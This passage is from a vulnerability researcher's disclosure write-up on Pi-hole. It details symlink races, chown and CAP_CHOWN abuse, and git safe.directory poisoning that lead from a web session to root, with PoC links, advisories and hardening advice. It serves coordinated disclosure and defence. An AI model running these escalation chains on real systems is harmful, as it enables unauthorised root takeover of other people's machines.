chown -R pihole:pihole /etc/pihole/ /var/log/pihole/
...
# allow pihole to access subdirs in /etc/pihole (sets execution bit on dirs)
find /etc/pihole/ /var/log/pihole/ -type d -exec chmod 0755 {} +
# Set all files (except TLS-related ones) to u+rw g+r
find /etc/pihole/ /var/log/pihole/ -type f ! \( -name '*.pem' -o -name '*.crt' \) -exec chmod 0640 {} +
# Set TLS-related files to a more restrictive u+rw *only* (they may contain private keys)
find /etc/pihole/ -type f \( -name '*.pem' -o -name '*.crt' \) -exec chmod 0600 {} +
```

find is just building a list of arguments to pass to the `-exec` command. Those are two separate independent operations. It has no idea if the file/directory it matched has changed before it passes that list to the `-exec` function once it's in the argument list.

This script is running as root, and made these directories owned by pihole user. So we can race the find.

We can extend the run-time of find significantly to make this race winnable every time. Using the `chmod 0755` example since that's the highest permissions of the three:

```bash
find /etc/pihole/ /var/log/pihole/ -type d -exec chmod 0755 {} +
```

It has to scan all of `/var/log/pihole/` that we own as the `pihole` user. It is only going to build an argument list of directories though. If we create a real directory, but we also create 100,000 files, we can  slow down the full walk that find has to do.

The race is:
- Plant a directory like `swapme`
- Plant 100,000 files
- Setup an inotifywatch() on `swapme`
- Kill pihole-FTL to trigger a new prestart run
- find walks /var/log/pihole, adds `swapme` to argument list
- inotify fires when find sees the folder
- swap `swapme` with a symlink to /root
- find finishes searching, passes argument list to `-exec`
- prestart runs `chmod 0755 /root`

You can do this with multiple directories if you want to chmod multiple files/paths.

For the slow step, always plant files/directories that do not match the `-type d` filters. find flushes to `-exec` as argv fills up. My first test with 100,000 fake directories caused find to flush quickly, making the race more difficult.

Folded my recommendations for hardening by moving the find/exec into the `su pihole` block. It's a new separate bug live in shipped releases, but it's only making the files readable not writable, and it doesn't change ownership to pihole, so it's low impact. I think we have generated enough advisories from one project. Folded it into the same advisory as the [updatechecker symlinks](#updatechecker-symlinks).

### gravity.sh chown

The `gravity.sh` script is what is run to manage the gravity database. When run from the CLI by a `pihole -g`, the `pihole` script has this:

```
"-g" | "updateGravity"          ) need_root=true;;
```

Which means it will exit and tell the user to run it under sudo if not running as root. It runs gravity.sh as root, which contains this:

```bash
GRAVITYDB=$(getFTLConfigValue files.gravity)
GRAVITY_TMPDIR=$(getFTLConfigValue files.gravity_tmp)
...
gravityDBfile="${GRAVITYDB}"
gravityTEMPfile="${GRAVITYDB}_temp"
```

The pihole user controls the value of `files.gravity` stored in `pihole.toml`. gravity.sh also contains this function:

```bash
fix_owner_permissions() {
  # Fix ownership and permissions for the specified file
  # User and group are set to pihole:pihole
  # Permissions are set to 664 (rw-rw-r--)
  chown pihole:pihole "${1}"
  chmod 664 "${1}"

  # Ensure the containing directory is owned by pihole:pihole
  # so the pihole user can write to it without requiring group-write
  # permissions (which would change the directory mode unexpectedly)
  chown pihole:pihole "$(dirname -- "${1}")"
}
```

It is called several different places. The simplest to use are:
- generate_gravity_database(): `fix_owner_permissions "${gravityDBfile}"`
- (end of script): `fix_owner_permissions "${gravityTEMPfile}"`

So we can get multiple target paths and their parent directories to be `chown`ed to pihole. If we set `files.gravity=/etc/sudoers.d/notreal`, on the next `sudo pihole -g` run, it hits `migrate_to_database()`, which checks:

```bash
if [ ! -e "${gravityDBfile}" ]; then
  # Create new database file - note that this will be created in version 1
  echo -e "  ${INFO} Creating new gravity database"
  if ! generate_gravity_database; then
```

So if the gravity db doesn't exist it calls `generate_gravity_database()`, which creates the db and then calls the `fix_owner_permissions()` function that does the chown on both the target and the parent directory. In this case the parent is `/etc/sudoers.d`.

Pointing it at `/etc/sudoers.d` or even `/opt/pihole` (since the pre-start scripts run as root), would let pihole edit the contents of the directory. Direct LPE to root from there.

The CLI path is the only vulnerable one that runs as root. The cron job and web-interface update methods run as pihole so there's no privilege to gain there. I would not think it is common to run `pihole -g` CLI, so this is likely minimal real-world impact. To mitigate on your box, just dont run `sudo pihole -g` and update through the web interface or cron job.

I submit this as an advisory just to notify the maintainers of it and suggested it as a low-priority robustness fix not a CVE/published advisory.

#### PoC

No real need for a PoC here, set `files.gravity=/etc/sudoers.d/something` and wait (possibly a really long time) for an admin to manually run 'sudo pihole -g'. `/etc/sudoers.d/` will become pihole owned, and you can drop a file there. Or use `/opt/pihole` and overwrite a script systemd runs as root (pre-start, etc), same idea.

## Fix-Review

I worked with the maintainers on several fixes. While reviewing the patches there were many interesting things to explore.

The following bugs were all caught in review, so did not ship in a tagged release.

I read the fix PRs the same as the original and checked to see if the patches closed every path and if any new bugs were introduced along the way.

The PR closed the paths I had reported, but the same issue underneath them was still reachable through others keys and still reached code execution. The `CAP_CHOWN` mitigation had some interesting subtleties.

### rtc.set cap-retention

The `CAP_CHOWN` fix had the right instinct. FTL only needs the capability if the real-time clock is enabled, so the draft checks if `ntp.sync.rtc.set` is enabled and drops it if not - clearing it from the permitted set and lowering it from ambient, with a comment that "no child it executes can inherit it." Check the running process and it looks finished:

```bash
$ grep CapEff /proc/$(pgrep -x pihole-FTL)/status
CapEff: 0000000002807400
```

`cap_chown` (bit 0) is gone. Capabilities in Linux are a per-thread attribute though and `/proc/<pid>/status` reports only the thread-group leader. The drop ran on the main thread but `pihole-FTL` has several threads, and they are spawned before the drop. So the main thread drops `cap_chown` but the other threads do not. Check /proc/pid/task/tid/status for each thread:

```bash
$ grep -E "^(CapEff|Name)" /proc/$( pgrep pihole-FTL )/task/*/status
/proc/100684/task/100684/status:Name:   pihole-FTL
/proc/100684/task/100684/status:CapEff: 0000000002807400
/proc/100684/task/100741/status:Name:   database
/proc/100684/task/100741/status:CapEff: 0000000002807401
/proc/100684/task/100742/status:Name:   housekeeper
/proc/100684/task/100742/status:CapEff: 0000000002807401
/proc/100684/task/100743/status:Name:   dns-client
/proc/100684/task/100743/status:CapEff: 0000000002807401
/proc/100684/task/100744/status:Name:   timer
/proc/100684/task/100744/status:CapEff: 0000000002807401
/proc/100684/task/100745/status:Name:   webserver
/proc/100684/task/100745/status:CapEff: 0000000002807401
/proc/100684/task/100746/status:Name:   dotdoh-dot
/proc/100684/task/100746/status:CapEff: 0000000002807401
/proc/100684/task/100747/status:Name:   civetweb-timer
/proc/100684/task/100747/status:CapEff: 0000000002807401
/proc/100684/task/100748/status:Name:   civetweb-master
/proc/100684/task/100748/status:CapEff: 0000000002807401
/proc/100684/task/100749/status:Name:   terminator
/proc/100684/task/100749/status:CapEff: 0000000002807401
```

Every worker kept it including the CivetWeb threads that serve HTTP and run the `.lp` pages from the finding above. A Lua page's `io.popen` child is forked from one of those threads and inherits its ambient set, so the web exec chain still holds `CAP_CHOWN` after the main thread has "dropped" it. `capset()` and `prctl(PR_CAP_AMBIENT_LOWER)` only ever act on the calling thread, and the "main" thread has no authority over other thread's credentials. The drop has to run before the worker threads exist.

There is one quirk to this. FTL restarts itself by re-`execvp`ing at the end of `main()`. This is single-threaded from the main thread that has already lowered its ambient set so when it `execve`s the worker threads this time there is no cap_chown to inherit so workers will not have it. It is not until the next systemd restart of FTL that it regains cap_chown and the workers inherit it again. So whether workers have the cap depends on how FTL last started:

| Last start (RTC sync off) | leader | webserver / Lua threads |
| --- | --- | --- |
| systemd - boot, `systemctl restart`, `SIGKILL` -> `Restart=on-failure` | drops its own | keep it |
| FTL self-restart - `execvp`, any restart-flagged setting | already dropped | all drop |

The pihole-FTL systemd unit file has `Restart=on-failure` which a `pkill -9 pihole-FTL` will trigger and systemd will restart it, which regains the caps. Since the process runs as the same pihole user we can kill it and reliably re-gain the capability.

FTL runs under systemd with `ProtectSystem=full` which leaves `/opt` mounted read-write which is where pihole installs some misc scripts it relies on. With cap_chown, we just `chown pihole:` on the FTL PreStart script at `/opt/pihole/pihole-FTL-prestart.sh` and add our contents and restart it. As covered in the [Prestart logrotate](#prestart-logrotate) section this runs as root and drops systemd hardening options. 

#### Combining the two

The path from web-session to root for this chain is:

1. Set server log name/path (`files.log.ftl`,`files.log.webserver`)
2. Set webroot+serve_all (`config.webserver.paths.webroot`,`config.webserver.serve_all`)
3. Send DELETE request to log our Lua web-shell
4. Use Lua webshell to `pkill -9 pihole-FTL` to trigger systemd `restart=on-failure`
5. Pihole restarts with ambient CAP_CHOWN
6. Use Lua webshell to `chown pihole:pihole /opt/pihole/pihole-FTL-prestart.sh` (`ProtectSystem=full` leaves `/opt` read-write)
7. Add our commands to `/opt/pihole/pihole-FTL-prestart.sh`
8. Use Lua webshell to `pkill -9 pihole-FTL` to trigger systemd `restart=on-failure`
9. Systemd runs the unit `ExecStartPre=+/opt/pihole/pihole-FTL-prestart.sh` which runs our commands as root 

Step 8 onward could also use /var/spool/cron/crontab or /run/systemd any number of other paths with `CAP_CHOWN` but that's beyond the scope of this post.

### git safe.directory

This was the most interesting patch to review and attack.

As part of moving to running `updatechecker` as pihole instead of root, a function named `mark_repos_safe()` was created so that the pihole user could interact with the root-owned git repos in `/etc/.pihole` and `/var/www/html/admin` that are responsible for updating your pi-hole.

The function performed this:

```
mark_repos_safe() {
    for repo in "${PI_HOLE_LOCAL_REPO}" "${webInterfaceDir}"; do
        [[ -n "${repo}" ]] || continue
        if ! git config --system --get-all safe.directory 2>/dev/null | grep -qxF "${repo}"; then
            git config --system --add safe.directory "${repo}" || true
        fi
    done
}
```

root and pihole operating in the same directories has been the source of a lot of the vulnerabilities so I wanted to research it deeply. If we can get root to trust and operate on a pihole-owned repo we can get root exec. The `git config --system` is marking that directory safe for all users, not just the pihole user.

So I went looking for where `PI_HOLE_LOCAL_REPO` and `webInterfaceDir` are set.

At first it looks hardcoded:

```bash
# Root of the web server
webroot="/var/www/html"
webInterfaceDir="${webroot}/admin"
PI_HOLE_LOCAL_REPO="/etc/.pihole"
```

But that is only the default used on fresh installs. For a repair/update it runs:

```bash
webInterfaceDir=$(getFTLConfigValue "webserver.paths.webroot")$(getFTLConfigValue "webserver.paths.webhome")
```

We control the value of `webserver.paths.webroot` and `webserver.paths.webhome` as the pihole user.

So set `webserver.paths.webroot=/etc/pihole/` and `webserver.paths.webhome=repo` and create a symlink that points `/etc/pihole/repo -> /var/www/html/admin`. The next time a `pihole -r` runs or `pihole -up` actually updates, it will follow the symlink and operate normally on the real git repo in `/var/www/html/admin`. The important part is after it finishes, it runs `mark_repos_safe()` using our `webInterfaceDir` path.

`mark_repos_safe()` does not follow the symlink the way git did. It directly adds our `webInterfaceDir` (/etc/pihole/repo) to git safe.directory using the `--system` flag, impacting all users including root:

```bash
    for repo in "${PI_HOLE_LOCAL_REPO}" "${webInterfaceDir}"; do
            git config --system --add safe.directory "${repo}" || true
```

Now we delete the `/etc/pihole/repo` symlink and replace it with a crafted repo with a `.git/config` with hooks to execute, many options here. I used `core.fsmonitor`, add something like:

```ini
[core]
        fsmonitor = sh -c "id > /tmp/git-exec.log"
```

The next time a `pihole -up` or `pihole -r` runs, they run resetRepo() which will perform a `git reset --hard` which refreshes the index and runs our `fsmonitor` command because `/etc/pihole/repo` is now in the system safe.directory list, and we get root exec. Checking our log file:

```bash
$ cat /tmp/git-exec.log 
uid=0(root) gid=0(root) groups=0(root)
```

Suggested a quick fix of cd'ing to the directory so you get the resolved path, ensuring its root owned, then adding it. Or a path that's a lot more work having root keep a cache with the few pieces of info it needs so there is no need for any trusted directories, but that gets into a whole rabbit hole of what functions reference the data from where I will leave out to keep the article more brief.

### updatecheck chown

The patch I reviewed created a `mktemp` directory as root, but still under `/etc/pihole/versions.XXXXXX`. This is still a pihole owned directory, which means pihole can still replace that temp directory that root owns.

The larger issue is that at the end of the script, it performed a `chown pihole:pihole "${VERSION_FILE_TMP}"`. Before we could only chmod target files to 755 or 644, but now we can `chown` them. What was an arbitrary file-disclosure/file-clobber turned into a full LPE.

To exploit it, just setup an inotify on /etc/pihole/ and wait for versions.XXXXXX to get created, replace it with a symlink to /etc/shadow while updatecheck is running, at the end we get ownership of /etc/shadow and can just add a known password hash to root.

Since pihole owns the directory and can change the contents already, the chown can be dropped entirely. I also recommended not running updatecheck as root ever but that is a larger change.

## Hardening

The direct fixes are straightforward but mostly fall to the maintainers:

- Allowlist safe dnsmasq and CivetWeb options instead of writing raw API contents.
- Validate imported Teleporter files according to their expected content before writing them.
- Keep every root-consumed object in a directory whose entries cannot be replaced by pihole.
- Remove CAP_CHOWN.
- Build version files through a root-owned temporary file in a directory only root can rename in and atomically install them without following symlinks.

Things you can do (and should be doing regardless):
- Keep the API on isolated trusted admin networks, firewalled as restrictive as possible
- Use a strong main password
- Do not run no-password mode

Building SELinux policy for Pi-hole would be nice to have but a little ambitious. I will see if the maintainers strip `CAP_CHOWN`. I may add significant hardening to the systemd unit file and see what breaks and where I end up.

Update: the maintainers actually implemented a more hardened solution than I proposed on a couple of these. Instead of an allowlist of safe values, they marked the risky configuration options `FLAG_API_READ_ONLY`, so the API cannot set them at all. Changing them requires editing `pihole.toml` on disk, which requires system access as pihole. It closes the whole class.

## Proofs of concept

The PoCs are all up on my GitHub at [linnemanlabs/advisories](https://github.com/linnemanlabs/advisories).

These PoCs modify live Pi-hole configuration and may alter DHCP leases, root’s crontab, logrotate configuration, file ownership, the mode of security-sensitive files, possibly serving your entire filesystem at `/` on the web interface. Run them only on disposable test systems and/or review and understand each script before running them.

The standalone PoCs mostly have a `--cleanup` option that does well. The root exec chains are going to leave root crontabs, root shells, world-readable /etc/shadow, connect-back shells firing on a timer, etc. 

The end-to-end chain combines vulnerabilities to go from web-session to pi-hole code-exec, then escalate to root code-exec.

| PoC                                                                                                                             | Ran on               | Affected    | Fixed        | Result          |
| ------------------------------------------------------------------------------------------------------------------------------- | -------------------- | ----------- | ------------ | --------------- |
| [dnsmasq_lines_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/dnsmasq_lines_exec.sh)                 | FTL 6.7              | ≤6.7        | 6.7.1        | pihole exec     |
| [civetweb_advancedopts_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/civetweb_advancedopts_exec.sh) | FTL 6.6.2            | 6.3 - 6.6.2 | 6.7          | pihole exec     |
| [civetweb_advancedopts_put.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/civetweb_advancedopts_put.sh)   | FTL 6.7              | ≤6.7        | 6.7.1        | pihole exec     |
| [logpoison_lp_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/logpoison_lp_exec.sh)                   | FTL 6.7              | ≤6.7        | in HEAD only | pihole exec     |
| [updatecheck_symlink.py](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/updatecheck_symlink.py)               | Core 6.4.3           | ≤current    | unfixed      | file disclosure |
| [cap_chown_cron.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/cap_chown_cron.sh)                         | Core 6.4.3 / FTL 6.7 | ≤6.7        | 6.7.1        | pihole -> root  |
| [prestart_logrotate.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/prestart_logrotate.sh)                 | Core 6.4.2           | 6.0 - 6.4.2 | 6.4.3        | pihole -> root  |

| Chain PoC                     | Ran on                | Affected | Fixed  | Result      |
| ----------------------------- | --------------------- | -------- | ------ | ----------- |
| [chain_dnsmasq_logrotate_root.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_dnsmasq_logrotate_root.sh) | FTL 6.6.2 /Core 6.4.2 | ≤6.7     | 6.7.1  | web -> root |
| [chain_advancedopts_webdav_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_advancedopts_webdav_capchown.sh)                                   | FTL 6.7 / Core 6.4.3  | ≤6.7     | 6.7.1  | web -> root |
| [chain_logpoison_lp_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_logpoison_lp_capchown.sh)                                   | FTL 6.7 / Core 6.4.3  | ≤6.7     | 6.7.1  | web -> root |

**Update**: Made a new end-to-end chain at [poc/pi-hole/chain_advancedopts_webdav_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_advancedopts_webdav_capchown.sh) using the newer CivetWeb `webserver.advancedOpts` -> WebDAV `PUT` vulnerabilities. It is cleaner since it provides the direct webshell with output.

**Update again**: I built a third end-to-end chain at [poc/pi-hole/chain_logpoison_lp_capchown.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_logpoison_lp_capchown.sh) that uses the latest webroot+log poison vulnerabilities. If you are on v6.7 that patched the earlier routes, this is the one to use.

## Advisories

| Finding                                         | CVE/GHSA |
| ----------------------------------------------- | -------- |
| dnsmasq_lines config -> pihole exec             | [GHSA-ww5x-xx4x-qvjr](https://github.com/pi-hole/FTL/security/advisories/GHSA-ww5x-xx4x-qvjr) |
| CivetWeb advancedOpts config -> pihole exec     | [CVE-2026-65963](https://github.com/pi-hole/FTL/security/advisories/GHSA-8j7w-m3cr-6q6x) |
| CivetWeb advancedOpts fix bypass -> pihole exec | [GHSA-2794-hrj8-5jg9](https://github.com/pi-hole/FTL/security/advisories/GHSA-2794-hrj8-5jg9) |
| webroot+serveall -> log poison -> pihole exec   | [GHSA-gx63-h4w6-f46g](https://github.com/pi-hole/FTL/security/advisories/GHSA-gx63-h4w6-f46g) |
| CAP_CHOWN pihole -> root exec                   | [GHSA-j8vh-6fp9-cjcx](https://github.com/pi-hole/pi-hole/security/advisories/GHSA-j8vh-6fp9-cjcx) |
| prestart pihole -> root exec                    | [CVE-2026-50130](https://github.com/pi-hole/pi-hole/security/advisories/GHSA-h8w9-qx2v-wrww) |
| Updatechecker symlink race                      | [GHSA-xch2-4qxw-g5vj](https://github.com/pi-hole/pi-hole/security/advisories/GHSA-xch2-4qxw-g5vj) |

## Disclosure timeline

* **2026-07-03** - Audit completed.

* **2026-07-04/05** - Five reports submitted through GitHub private vulnerability reporting across `pi-hole/pi-hole` and `pi-hole/FTL`.

* **2026-08-05** - First public disclosure published.

* **2026-08-06** - Additional RCE and file-read discovered. Disclosure submit to `pi-hole/FTL`.

* **2026-08-14** - Additional RCE discovered. Disclosure submit to `pi-hole/FTL`.

* **2026-09-23** - Disclosure updated with new findings.

* **2026-09-23** - Additional LPE discovered. Disclosure submit to `pi-hole/pi-hole`.

Total of 7 reports with 9 high-impact findings. 5 RCE, 3 LPE to root, 1 file disclosure. Several patch review findings and low-impact bugs also.

The pi-hole team is great to work with. I appreciate that they take every vulnerability seriously.

## Credits

Three of these bugs were found by other researchers around the same time:

| Bug | Researcher | CVE | GHSA |
| --- | ---------- | --- | ---- |
| Pi-hole prestart logrotate | [supperhellokitty20](https://github.com/supperhellokitty20) | CVE-2026-50130 | [GHSA-h8w9-qx2v-wrww](https://github.com/pi-hole/pi-hole/security/advisories/GHSA-h8w9-qx2v-wrww)|
| CivetWeb advancedOpts | [SakusenSec](https://github.com/SakusenSec) | CVE-2026-65963 | [GHSA-8j7w-m3cr-6q6x](https://github.com/pi-hole/FTL/security/advisories/GHSA-8j7w-m3cr-6q6x) |
| dnsmasq_lines config | [Michael-JRead](https://github.com/Michael-JRead) and [m19simmons](https://github.com/m19simmons) | | [GHSA-ww5x-xx4x-qvjr](https://github.com/pi-hole/FTL/security/advisories/GHSA-ww5x-xx4x-qvjr) |

## Tested versions

The audit was performed on the latest versions at the time:
- Core 6.4.2
- FTL 6.6.2
- Web 6.5.1

Tested on both Raspbian and Ubuntu 26.

## Conclusion

TL;DR:

- Pi-hole exposed raw configuration for two embedded servers.
- Both servers have options that execute programs.
- The service account holds excessive capabilities that chain to root exec.
- A root prestart hook signs off on attacker-controlled content by changing it to root ownership.
- A root cron job followed pathnames in a directory controlled by that same service account.
- Additional systemd unit hardening could be applied.

Each decision looks smaller when viewed alone:

- a web-server configuration option
- a non-root daemon
- one retained capability
- one ownership repair
- one cached version file

Those decisions turn an authenticated Pi-hole web session into code execution as pihole, and chain pihole into root through multiple independent paths. The daemon is non-root, but the surrounding system allows its service account to author objects that root later trusts.
